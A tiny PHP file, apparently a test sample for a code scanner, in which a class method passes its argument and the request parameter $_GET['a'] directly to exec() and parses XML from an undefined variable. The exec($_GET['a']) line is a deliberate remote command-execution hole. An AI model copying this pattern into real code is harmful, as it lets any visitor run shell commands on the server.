<?php
class Stab
{
    public function get($a)
    {
        exec($a);
        $x = simplexml_load_string($sEdsXml);
        exec($_GET['a']);
    }
}
